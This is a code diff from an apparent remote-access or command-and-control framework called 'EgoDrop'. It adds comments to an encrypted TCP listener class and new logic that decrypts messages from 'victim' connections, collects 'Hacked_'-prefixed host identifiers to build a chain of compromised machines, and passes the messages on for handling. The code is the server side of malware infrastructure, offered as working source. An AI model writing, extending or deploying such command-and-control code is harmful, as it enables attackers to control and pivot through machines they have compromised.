@@ -15,6 +15,12 @@ namespace EgoDrop
         private Socket m_sktSrv { get; set; }
         public Dictionary<string, clsVictim> m_dicVictim = new Dictionary<string, clsVictim>();
 
+        /// <summary>
+        /// TCP listener(RSA+AES).
+        /// </summary>
+        /// <param name="szName"></param>
+        /// <param name="nPort"></param>
+        /// <param name="szDescription"></param>
         public clsTcpListener(string szName, int nPort, string szDescription)
         {
             m_szName        = szName;
@@ -26,6 +32,9 @@ namespace EgoDrop
             m_sktSrv        = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
         }
 
+        /// <summary>
+        /// Start port listening.
+        /// </summary>
         public override void fnStart()
         {
             if (m_bIsListening)
@@ -48,6 +57,9 @@ namespace EgoDrop
             m_sktSrv.BeginAccept(new AsyncCallback(fnBeginAcceptCallback), m_sktSrv);
         }
 
+        /// <summary>
+        /// Stop port listening.
+        /// </summary>
         public override void fnStop()
         {
             m_sktSrv?.Close();
@@ -170,6 +182,24 @@ namespace EgoDrop
                                 {
                                     string szPlain = victim.m_crypto.fnszAESDecrypt(abBuffer);
                                     List<string> lsMsg = szPlain.Split('|').Select(x => clsEZData.fnB64D2Str(x)).ToList();
+
+                                    List<string> lsVictim = new List<string>();
+                                    for (int i = 0; i < lsMsg.Count; i++)
+                                    {
+                                        string s = lsMsg[i];
+                                        if (s.StartsWith("Hacked_"))
+                                        {
+                                            lsVictim.Add(s);
+                                        }
+                                        else
+                                        {
+                                            lsMsg = lsMsg[i..];
+                                            break;
+                                        }
+                                    }
+
+                                    if (lsMsg[0] == "info")
+                                        fnOnAddChain(lsVictim);
 
                                     fnOnReceivedMessage(victim, lsMsg);
                                 }
